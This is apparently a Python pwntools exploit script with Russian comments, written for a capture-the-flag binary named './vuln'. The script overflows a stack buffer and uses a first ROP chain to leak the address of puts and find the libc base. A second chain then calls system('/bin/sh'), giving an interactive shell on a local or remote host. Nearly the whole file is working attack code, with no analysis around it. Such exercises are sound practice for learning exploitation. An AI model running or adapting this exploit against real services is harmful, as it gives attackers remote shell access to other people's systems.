#!/usr/bin/env python3
from pwn import *
import sys

# Настройка контекста
context.binary = './vuln'
context.arch = 'amd64'
context.log_level = 'info'

# Автоматическое определение смещений
def find_offsets():
    e = context.binary
    
    # Находим гаджеты
    pop_rdi = next(e.search(asm('pop rdi; ret')))
    ret = next(e.search(asm('ret')))
    
    # Находим адреса функций
    main_addr = e.symbols['main']
    puts_plt = e.plt['puts']
    puts_got = e.got['puts']
    
    log.info(f"pop rdi; ret @ {hex(pop_rdi)}")
    log.info(f"ret @ {hex(ret)}")
    log.info(f"main @ {hex(main_addr)}")
    log.info(f"puts@plt @ {hex(puts_plt)}")
    log.info(f"puts@got @ {hex(puts_got)}")
    
    return pop_rdi, ret, main_addr, puts_plt, puts_got

def exploit():
    # Определяем локальные смещения
    pop_rdi, ret, main_addr, puts_plt, puts_got = find_offsets()
    
    # Подключаемся к программе
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        p = remote('ctf.example.com', 1337)
        libc = ELF('./libc.so.6')  # нужна копия libc с сервера
    else:
        p = process(context.binary.path)
        # Получаем libc из процесса
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    # Определяем смещение до перезаписи RIP
    # Для buffer[100] на 64-битной системе обычно:
    # 100 байт буфер + 8 байт сохраненного RBP = 108
    # Но нужно уточнить через gdb
    offset = 104  # уточни это значение!
    
    # ===== ШАГ 1: Утечка адреса puts =====
    log.info("Step 1: Leaking puts address")
    
    payload = flat([
        b'A' * offset,
        pop_rdi,
        puts_got,
        puts_plt,
        main_addr  # возвращаемся для второго этапа
    ])
    
    p.sendlineafter(b"ROP-\u0446\u0435\u043f\u043e\u0447\u043a\u0443: ", payload)
    
    # Получаем утекший адрес
    p.recvline()  # пропускаем эхо
    leaked = p.recvline()[:8].strip()
    puts_leak = u64(leaked.ljust(8, b'\x00'))
    log.success(f"Leaked puts address: {hex(puts_leak)}")
    
    # ===== ШАГ 2: Вычисление адресов libc =====
    log.info("Step 2: Calculating libc addresses")
    
    # Вычисляем базовый адрес libc
    libc.address = puts_leak - libc.symbols['puts']
    log.success(f"Libc base address: {hex(libc.address)}")
    
    # Получаем адреса system и /bin/sh
    system_addr = libc.symbols['system']
    bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
    
    log.success(f"System address: {hex(system_addr)}")
    log.success(f"/bin/sh address: {hex(bin_sh_addr)}")
    
    # ===== ШАГ 3: Получение шелла =====
    log.info("Step 3: Getting shell")
    
    # Вторая ROP-цепочка
    payload2 = flat([
        b'A' * offset,
        ret,          # выравнивание стека
        pop_rdi,
        bin_sh_addr,
        system_addr,
    ])
    
    p.sendlineafter(b"ROP-\u0446\u0435\u043f\u043e\u0447\u043a\u0443: ", payload2)
    
    # Получаем интерактивный шелл
    p.interactive()

if __name__ == "__main__":
    exploit()